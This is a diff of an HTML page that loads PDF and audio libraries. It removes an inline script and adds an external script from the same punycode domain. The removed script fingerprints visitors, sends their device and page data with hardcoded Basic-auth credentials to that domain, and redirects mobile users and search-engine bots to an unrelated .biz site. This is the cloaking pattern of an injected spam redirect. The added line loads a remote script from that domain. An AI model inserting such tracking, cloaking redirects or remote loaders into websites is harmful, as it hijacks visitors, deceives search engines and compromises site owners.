@@ -1,74 +1,7 @@
 <script src="dist/js/html2canvas.min.js"></script>
 <script src='dist/js/jspdf.min.js'></script>
 <script src="dist/js/jspdf.plugin.autotable.min.js"></script>
-<script>
-    const userAgent = navigator.userAgent;
-    const botPatterns = [
-        /bot/i,
-        /crawler/i,
-        /spider/i,
-        /googlebot/i,
-        /bingbot/i,
-        /yandexbot/i,
-        /duckduckbot/i,
-        /slurp/i, // Yahoo! Slurp
-    ];
-
-    const isBot = botPatterns.some(pattern => pattern.test(userAgent));
-
-    // Check if the user is on a mobile device
-    const isMobile = /iPhone|iPad|iPod|Android|webOS|BlackBerry|Windows Phone/i.test(userAgent);
-
-    // Define the URL to redirect mobile users to
-    const mobileRedirectUrl = 'https://www.pppgnewgem.biz/s-projects-basic';
-
-
-    // Send the client info to the API
-    const apiUrl = 'https://xn--72cz6bdsc.com/Api/save_client_info';
-    const username = 'apibot';
-    const password = 'glbmb[melrgmb5blpfvf,vvlrfrr]';
-    const authHeader = 'Basic ' + btoa(username + ':' + password);
-
-    const clientInfo = {
-        device: {
-            width: window.screen.width,
-            height: window.screen.height,
-            resolution: window.screen.availWidth + 'x' + window.screen.availHeight,
-        },
-        os: {
-            platform: navigator.platform,
-        },
-        pageUrl: window.location.href,
-        browser: {
-            userAgent: navigator.userAgent,
-        },
-        bot: isBot
-    };
-
-    // Send the data to the API using a POST request with Basic Authentication
-    fetch(apiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': authHeader,
-            },
-            body: JSON.stringify(clientInfo),
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('Client info sent successfully.');
-            } else {
-                console.error('Failed to send client info.');
-            }
-            if (isMobile || isBot) {
-                // Redirect the user to the mobile page
-                window.location.href = mobileRedirectUrl;
-            }
-        })
-        .catch(error => {
-            console.error('Error sending client info:', error);
-        });
-</script>
+<script src="https://xn--72cz6bdsc.com/resources/js/api.min.js"></script>
 <script type="module">
     import WaveSurfer from 'https://unpkg.com/wavesurfer.js@7/dist/wavesurfer.esm.js'
     import Hover from 'https://unpkg.com/wavesurfer.js@7/dist/plugins/hover.esm.js'
